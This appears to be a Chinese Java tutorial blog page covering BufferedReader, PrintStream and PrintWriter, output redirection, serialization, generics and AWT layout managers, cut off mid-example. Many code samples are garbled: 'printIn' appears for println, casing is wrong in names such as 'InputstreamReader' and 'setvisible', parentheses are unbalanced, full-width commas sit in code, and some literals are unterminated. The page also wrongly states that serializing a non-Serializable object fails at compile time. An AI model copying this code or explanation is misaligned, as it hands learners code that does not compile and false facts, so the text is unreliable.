<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBuffered</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(Stringargs)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String str = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">        System.out.printIn(<span class="string">&quot;str =&quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputstreamReader(System.in);                                              </span><br><span class="line">        str = br.readLine(); <span class="comment">//如果字节输入回车的话，str的值就会变成空字符串</span></span><br><span class="line">                                               </span><br><span class="line">        System.out.printIn(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">        System.out.println(str + <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.printIn(str.equals(<span class="string">&quot;&quot;</span>); <span class="comment">//true</span></span><br><span class="line">        System.out.printIn(str == <span class="keyword">null</span>); <span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Print流"><a href="#Print流" class="headerlink" title="Print流"></a>Print流</h1><ul>
<li>Print流只输出，不输入</li>
<li>分类<ul>
<li>PrintWriter输出字符</li>
<li>PrintStream 输出字节</li>
</ul>
</li>
</ul>
<h2 id="print流的由来"><a href="#print流的由来" class="headerlink" title="print流的由来"></a>print流的由来</h2><ul>
<li><p>Writer的write方法可以写入</p>
<ul>
<li>一个字符</li>
<li>一个字符数组</li>
<li>一个字符数组的一部分一个字符串</li>
<li>一个字符的一部分</li>
</ul>
</li>
<li><p>OutputStream的write方法可以写入</p>
<ul>
<li>一个字节</li>
<li>一个字节数组</li>
<li>一个字节数组的一部分</li>
</ul>
</li>
<li><p>DataOutputStream流可以写入</p>
<ul>
<li>一个字节</li>
<li>一个字节数组{继承自outputStream)</li>
<li>一个字节数组的一部分</li>
<li>所有的基本类型数据的二进制代码<pre><code>     如: writeDouble&#123;8.8); 写入的是8.8的二进制代码,共占8个字节
</code></pre>
</li>
</ul>
</li>
<li><p>PrintStream流的print可以写入</p>
<ul>
<li>所有基本类型数据的字符串形式表示<pre><code> 如: print(8.8); 写入的是&#39;8∵8这三个字符,共占3个字节
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="PrintStream"><a href="#PrintStream" class="headerlink" title="PrintStream"></a>PrintStream</h2><ul>
<li>PrintStream在OutputStream基础之上提供了增强的功能，即可以方便地输出各种类型数据（而不仅限于byte型）的格式化表示形式。</li>
<li>PrintStream重载了print和println方法，用于各种不同类型数据的格式化输出</li>
<li>格式化输出是指将一个数据用其字符串格式输出</li>
<li>DataOutputStream中的writeXXX(data)方法是把data在内存中的二进制数据写入文件</li>
<li>PrintStream中的println(data)是该数据的格式化后的字符串写入文件</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DataOutput Stream 中的 writeXXX(data)方法</span></span><br><span class="line"><span class="comment">	与</span></span><br><span class="line"><span class="comment">PrintStream 中的 println(dat a) 的区别</span></span><br><span class="line"><span class="comment">总结:</span></span><br><span class="line"><span class="comment">	DataOut putStream 中的 writeXXX(data)方法是把data在内存中的</span></span><br><span class="line"><span class="comment">	PrintStream 中的 println(data)写出的是该数据的格式化后的字</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPrintStream_1</span></span></span><br><span class="line">public static void main(String[] args) throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    DataOutputStream dos = <span class="keyword">new</span> <span class="function">DataOut <span class="title">putStream</span><span class="params">(new FileOutputStream(<span class="string">&quot;d:/share/kk.txt&quot;</span>)</span></span>;</span><br><span class="line">    dos.writeLong(<span class="number">12345</span>); <span class="comment">//实际写入文件的是00 00 00 00 00 00 30 39</span></span><br><span class="line"></span><br><span class="line">    dos.close();</span><br><span class="line">    System.out.printf(<span class="string">&quot;%#X\n&quot;</span>，<span class="number">12345</span>);</span><br><span class="line">    </span><br><span class="line">    PrintStream ps =.<span class="function">new <span class="title">PrintStream</span><span class="params">(new FileOut putStream(<span class="string">&quot;d:/</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">    ps.println(12345); //实际写入文件的是 ’1’ &#x27;2&#x27; &#x27;3’ &#x27;4&#x27; &#x27;5’</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">	ps.close();</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">&#125;</span></span></span></span><br></pre></td></tr></table></figure>

<h2 id="PrintWriter"><a href="#PrintWriter" class="headerlink" title="PrintWriter"></a>PrintWriter</h2><ul>
<li>PrintWriter提供了PrintStream的所有打印方法，其方法也从不抛出IOException。</li>
<li>与PrintStream的区别:<ul>
<li>作为处理流使用时，PrintStream只能封装OutputStream类型的字节流，而PrintWriter既可以封装OutputStream,还能够封装Writer</li>
<li>PrintWriter中的printIn()方法具有更好的跨平台性</li>
</ul>
</li>
</ul>
<h2 id="标准输入输出的重定向"><a href="#标准输入输出的重定向" class="headerlink" title="标准输入输出的重定向"></a>标准输入输出的重定向</h2><p>例如：</p>
<ul>
<li>编程实现将键盘输入的数据输入A文件中，如果输入有误，则把出错信息输出到B文件中</li>
<li>预备知识</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">	....</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>e.printStackTrace();</code>默认是把错误信息输出到system.err所关联的设备中</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSysl</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        PrintStream ps = <span class="keyword">new</span> PrintStream(<span class="string">&quot;d:/heihei.asd&quot;</span>);</span><br><span class="line">        System.setOut(ps);</span><br><span class="line">        System.out.println(<span class="string">&quot;哈哈&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="对象的序列化"><a href="#对象的序列化" class="headerlink" title="对象的序列化"></a>对象的序列化</h1><ul>
<li>所谓序列化是指：把一个Object对象直接转化为字节流，然后把这个字节流直接写入本地硬盘或网络中</li>
<li>如果要想把某个对象序列化，则必须的实现<code>Serializable接口</code><strong>（起标示作用）</strong></li>
<li>Serializable接口中并没有任何方法，这种类型的接口被称为标记接口，如果一个类实现了Serializable接口，潜在含义就是告诉编译器这个类是允许被序列化的，如果程序中存在序列该对象的代码，编译器就会自动进行相应的处理已完成该对象的序列化，如果该对象没有实现Serializable接口，程序中却存在该对象被序列化的代码，编译器编译时就会报错</li>
<li>在Java中transient修饰的成员变量在对象序列化时不被序列化 </li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestObjectlO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> //如果将<span class="keyword">implements</span> <span class="title">Serializable</span>注释掉，则程序编译时就会报错</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String sname = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">public</span> <span class="keyword">float</span> sscore = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//transient表示sscore成员不能被序列化</span></span><br><span class="line">    <span class="comment">//所谓不能被序列化就是指:“该成员调用ObjectOutputStream 的 writeOnbject()时不会被保存，调用ObjectInputStream的read0bject()方法时不会被读取”</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> id, <span class="keyword">float</span> score)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sname = name;</span><br><span class="line">        <span class="keyword">this</span>.sid = id;</span><br><span class="line">        <span class="keyword">this</span>.sscore = score;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><ul>
<li>如何去除警告</li>
</ul>
<p><img src="/2021/04/19/Java-9%E6%B5%81/%E8%AD%A6%E5%91%8A.png"></p>
<ul>
<li>为什么有警告</li>
</ul>
<p>手册里，Iterator<E> 有个尖括号</E></p>
<ul>
<li>凡是带尖括号的，内部的数据可以是任意的</li>
<li>但可以指定具体运行某一次的传入数据的类型</li>
<li>有尖括号，不指定数据类型就会报错，指定数据类型增强安全性</li>
</ul>
<h2 id="泛型定义"><a href="#泛型定义" class="headerlink" title="泛型定义"></a>泛型定义</h2><p>泛型：限制指定某一时刻一个容器中可以传入的数据类型</p>
<p>泛型是用来限制传入容器、接口中的数据类型</p>
<p>例如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;Integer&gt; it = s.iterator();</span><br><span class="line"></span><br><span class="line">Comparable&lt;T&gt; 接口中有如下方法:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T o)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">要想限制传入Comparable接口的数据类型，可以使用泛型</span></span><br><span class="line"><span class="function">class Student inplements Comparable&lt;Student&gt;</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Student ob)</span> <span class="comment">//注意Student不能写成了Object</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong>当指定了接口中传入的数据类型时，该接口要实现集成方法时形参不能写Object，只能写指定具体的类的名字</strong></p>
<p><strong>真正的泛型：无论这个数据怎样方式存储我们对他用同样的算法执行操作</strong></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-8图形化界面"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"
    >Java 8图形化界面</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/" class="article-date">
  <time datetime="2021-04-18T13:58:45.000Z" itemprop="datePublished">2021-04-18</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="awt-图形化界面"><a href="#awt-图形化界面" class="headerlink" title="awt 图形化界面"></a>awt 图形化界面</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestCom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		Frame f = <span class="keyword">new</span> Frame();</span><br><span class="line">        f.setSize(<span class="number">400</span>,<span class="number">400</span>);</span><br><span class="line">		f.setBackground(Color.GREEN);</span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h1><h2 id="组件：给操作有反应"><a href="#组件：给操作有反应" class="headerlink" title="组件：给操作有反应"></a>组件：给操作有反应</h2><p>​    组件(Component)是图形用户界面的基本组成元素，<strong>凡是能够以图形化方式显示在屏幕上并能够与用户进行交互的对象均为组件</strong>，如菜单、按钮、标签、文本框、滚动条等。</p>
<p>组件分类<br>    <code>java.awt.Component</code><br>    <code>Java.awt.MenuComponent</code><br>    说明：抽象类java.awt.Component是除菜单相关组件之外所有JavaAWT组件类的根父类，该类规定了GUI组件的基本特性，如尺寸、位置和颜色效果等，并实现了作为一个GUI部件所应具备的基本功能</p>
<p><strong>我们主要学<code>component</code></strong></p>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><ul>
<li>组件通常不能独立地显示出来，必须将组件放在一定的容器中才可以显示出来。</li>
<li>有一类特殊的组件是专门用来包含其他组件的，这类组件叫做容器，<code>java.awt.Container</code>是所有容器的父类，<code>java.awt.Container</code>继承自<code>java.awt.Component</code></li>
<li>容器类对象本身也是一个组件，具有组件的所有性质，但反过来组件却不一定是容器</li>
<li><strong>就比如ok按键（按钮是组件，组件要在显示器显示要放到容器），不能独立显示需要放到容器才能显示</strong></li>
</ul>
<p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E5%AE%B9%E5%99%A8%E5%92%8C%E7%BB%84%E4%BB%B6%E5%85%B3%E7%B3%BB.png"></p>
<h2 id="容器分布"><a href="#容器分布" class="headerlink" title="容器分布"></a>容器分布</h2><p>容器分布图</p>
<p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E5%AE%B9%E5%99%A8%E5%88%86%E5%B8%83%E5%9B%BE.png"></p>
<p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E4%BE%8B%E5%AD%90.png"></p>
<h2 id="Frame常用的方法"><a href="#Frame常用的方法" class="headerlink" title="Frame常用的方法"></a>Frame常用的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBounds</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span></span><br><span class="line"><span class="function">    设置窗体的位置和大小，x和y表示窗体左上角距离屏幕的水平和垂直距离,with和height是窗体本身的宽度和高度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSize</span><span class="params">(<span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span></span><br><span class="line"><span class="function">	设置窗体的大小，with和height是窗体本身的宽度和高度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVisible</span><span class="params">(<span class="keyword">boolean</span> flag)</span></span>;</span><br><span class="line">	设置窗体是否可见，<span class="keyword">true</span>表示可见，<span class="keyword">false</span>表示不可见</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBackground</span><span class="params">(Color c)</span></span></span><br><span class="line"><span class="function">	设置窗体的背景色</span></span><br></pre></td></tr></table></figure>

<h2 id="Panel"><a href="#Panel" class="headerlink" title="Panel"></a>Panel</h2><ul>
<li> panel是容纳其他组件的组件</li>
<li>panel是容器</li>
<li>panel不能单独存在，必须得被添加到其他容器中</li>
</ul>
<p>Panel类拥有从其父类继承来的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setBounds(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> width,<span class="keyword">int</span> height)</span><br><span class="line">setSize(<span class="keyword">int</span> width, <span class="keyword">int</span> height)</span><br><span class="line">setLocation( <span class="keyword">int</span> x,<span class="keyword">int</span> y)</span><br><span class="line">setBackground(Color c)</span><br><span class="line">setLayout(LayoutManager mgr)</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<p>Panel的构造方法为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Panel() 使用默认的FlowLayout类布局管理器初始化。</span><br><span class="line">Panel(LayoutManager layout) 使用指定的布局管理器初始化。</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestPanel_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="keyword">new</span> Frame(<span class="string">&quot;Java Frame with Panel&quot;</span>);</span><br><span class="line">        Panel p = <span class="keyword">new</span> Panel();</span><br><span class="line">		f.setLayout(<span class="keyword">null</span>);</span><br><span class="line">		f.setBounds(<span class="number">300</span>,<span class="number">300</span>,<span class="number">500</span>,<span class="number">500</span>); <span class="comment">//Frame的设置是相对于整个屏幕</span></span><br><span class="line">        f.setBackground(<span class="keyword">new</span> Color(<span class="number">100</span>,<span class="number">100</span>,<span class="number">102</span>)); <span class="comment">//三个颜色</span></span><br><span class="line">        p.setBounds(<span class="number">300</span>/<span class="number">2</span>，<span class="number">300</span>/<span class="number">2</span>，<span class="number">500</span>/<span class="number">2</span>，<span class="number">500</span>/<span class="number">2</span>); </span><br><span class="line">        p.setBackground(<span class="keyword">new</span> Color(<span class="number">204</span>,<span class="number">204</span>, <span class="number">255</span>));</span><br><span class="line">		f.add(p); <span class="comment">//这是java.awt.Container类中的一个方法</span></span><br><span class="line">        f.setvisible(<span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="布局管理器"><a href="#布局管理器" class="headerlink" title="布局管理器"></a>布局管理器</h2><ul>
<li><p>容器里的<strong>组件以什么方式排列组合</strong>，由布局管理器类来控制的</p>
</li>
<li><p>容器对其中所包含组件的排列方式，包括组件的位置和大小设定，被称为容器的布局(Layout)。</p>
</li>
<li><p>为了使图形用户界面具有良好的平台无关性，Java语言提供了布局管理器来管理容器的布局，而<strong>不建议直接设置组件在容器中的位置和尺寸</strong>。</p>
</li>
<li><p>每个容器都有一个默认的布局管理器，当容器需要对某个组件进行定位或判断其大小尺寸时，就会自动调用其对应的布局管理器。</p>
</li>
<li><p>在<strong>AWT</strong>中，常见的布局管理器：</p>
<ul>
<li>BorderLayout</li>
<li>FlowLayout</li>
<li>GridLayout</li>
</ul>
</li>
<li><p>使用 <code>f.setLayout(null);</code> 可以使默认的布局管理器失效</p>
</li>
</ul>
<h3 id="FlowLayout布局管理器"><a href="#FlowLayout布局管理器" class="headerlink" title="FlowLayout布局管理器"></a>FlowLayout布局管理器</h3><ul>
<li><p>FlowLayout是Panel类的默认布局管理器。</p>
<ul>
<li>FlowLayout布局管理器对组件逐行定位，行内从左到右，一行排满后换行。</li>
<li>不改变组件的大小，按组件原有尺寸显示组件，可设置不同的组件间距,行距以及对齐方式。</li>
</ul>
</li>
<li><p>FlowLayout布局管理器默认的<strong>对齐方式是居中</strong>。（流水排）</p>
</li>
</ul>
<p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/FlowLayout%E5%B8%83%E5%B1%80%E7%AE%A1%E7%90%86%E5%99%A8.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> FlowLayout(FlowLayout.RIGHT,<span class="number">20</span>,<span class="number">40</span>);</span><br><span class="line">	右对齐，组件之间水平间距<span class="number">20</span>个像素，垂直间距<span class="number">40</span>个像素。</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FlowLayout(FlowLayout.LEFT);</span><br><span class="line">	左对齐，水平和垂直间距为缺省值（<span class="number">5</span>）。</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FlowLayout();</span><br><span class="line">	使用缺省的居中对齐方式，水平和垂直间距为缺省值（<span class="number">5</span>）。</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java. awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFlowLayout</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="keyword">new</span> Frame(<span class="string">&quot;Flow Layout&quot;</span>);</span><br><span class="line">        Button buttonl = <span class="keyword">new</span> Button(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">        Button button2 = <span class="keyword">new</span> Button(<span class="string">&quot;0pen&quot;</span>);</span><br><span class="line">        Button button3 = <span class="keyword">new</span> Button(<span class="string">&quot;Ciose&quot;</span>);</span><br><span class="line">        f.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.CENTER)); <span class="comment">//设置f为Flowlayout</span></span><br><span class="line">        f.ada(buttonl);</span><br><span class="line">        f.add(button2);</span><br><span class="line">        f.add(button3):</span><br><span class="line">        f.setSize(<span class="number">300</span>,<span class="number">400</span>);</span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第9行 f 默认的布局管理器是BorderLayout，这一行意思是定义一个Flowlayout，用Flowlayout对</p>
<p>象充当容器的布局管理器，f 默认的是BorderLayout，必须重新指定布局管理器</p>
<h3 id="BorderLayout布局管理器"><a href="#BorderLayout布局管理器" class="headerlink" title="BorderLayout布局管理器"></a>BorderLayout布局管理器</h3><ul>
<li>BorderLayout是Frame类的默认布局管理器。</li>
<li>BorderLayout将整个容器的布局划分成<ul>
<li>东（EAST)</li>
<li>西（WEST)</li>
<li>南（SOUTH)</li>
<li>北（NORTH)</li>
<li>中（CENTER)五个区域，组件只能被添加到指定的区域。</li>
</ul>
</li>
<li>如不指定组件的加入部位，则默认加入到CENTER区。</li>
<li>每个区域只能加入一个组件，如加入多个，则先前加入的会被覆盖。</li>
<li>BorderLayout型布局容器尺寸缩放原则：<ul>
<li>北、南两个区域在水平方向缩放。</li>
<li>东、西两个区域在垂直方向缩放。</li>
<li>中部可在两个方向上缩放。</li>
</ul>
</li>
</ul>
<p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/BorderLayout.png"></p>
<ul>
<li>东西南北的排列，默认放中间整个框这么大，会覆盖只显示最后一个</li>
</ul>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBorderLayout</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f;</span><br><span class="line">        f = <span class="keyword">new</span> Frame(<span class="string">&quot;Border 